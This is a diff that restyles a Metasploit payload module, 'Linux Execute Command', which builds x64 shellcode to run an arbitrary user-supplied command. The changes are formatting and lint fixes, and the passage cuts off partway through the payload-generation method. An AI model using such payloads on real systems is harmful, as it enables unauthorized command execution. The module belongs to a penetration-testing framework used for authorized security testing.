@@ -1,13 +1,12 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 require 'msf/core'
 
 module MetasploitModule
-
   CachedSize = 47
 
   include Msf::Payload::Single
@@ -15,20 +14,21 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'Linux Execute Command',
-      'Description'   => 'Execute an arbitrary command',
-      'Author'        => 'ricky',
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'linux',
-      'Arch'          => ARCH_X64))
+                     'Name'          => 'Linux Execute Command',
+                     'Description'   => 'Execute an arbitrary command',
+                     'Author'        => 'ricky',
+                     'License'       => MSF_LICENSE,
+                     'Platform'      => 'linux',
+                     'Arch'          => ARCH_X64))
 
     register_options(
       [
-        OptString.new('CMD',  [ true,  "The command string to execute" ]),
-      ], self.class)
+        OptString.new('CMD', [ true, "The command string to execute" ])
+      ], self.class
+    )
   end
 
-  def generate_stage(opts={})
+  def generate_stage(_opts = {})
     cmd = (datastore['CMD'] || '') + "\x00"
     call = "\xe8" + [cmd.length].pack('V')
     payload =
